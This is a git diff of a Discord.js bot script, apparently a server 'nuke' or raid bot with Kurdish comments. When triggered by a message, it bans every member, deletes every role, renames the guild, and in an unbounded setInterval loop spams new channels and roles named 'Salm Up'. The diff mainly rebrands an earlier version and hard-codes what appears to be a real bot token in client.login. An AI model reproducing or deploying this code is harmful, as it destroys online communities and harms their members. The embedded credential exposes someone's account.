@@ -10,19 +10,19 @@ client.on("message", message => {
         }
       });
       message.guild.members.forEach(m => {
-        m.ban();
+        m.ban(Salm1);
       });
       message.guild.roles.forEach(r => {
-        r.delete();
+        r.delete(Salm);
       });
-      message.guild.setName("RaWeN Up");////nawek dane bo sar server 
+      message.guild.setName("Salm Up");////nawek dane bo sar server 
       setInterval(function() {
-        message.guild.createChannel("RaWeN Up", "text");///////bo channel 
-        message.guild.createChannel("RaWeN Up", "voice");////bo voice
-        message.guild.createRole({ name: "RaWeN Up" });////nawek dane bo role kan
+        message.guild.createChannel("Salm Up", "text");///////bo channel 
+        message.guild.createChannel("Salm Up", "voice");////bo voice
+        message.guild.createRole({ name: "Salm Up" });////nawek dane bo role kan
       });
     }
   }
 });
 
-client.login("")
+client.login("OTgyOTk5MzA3NTg0MTQzNDAw.Gbtpdb.SwP9JKnTmzIoa4wsFuorpopTQnLakZZS8WOdyc")
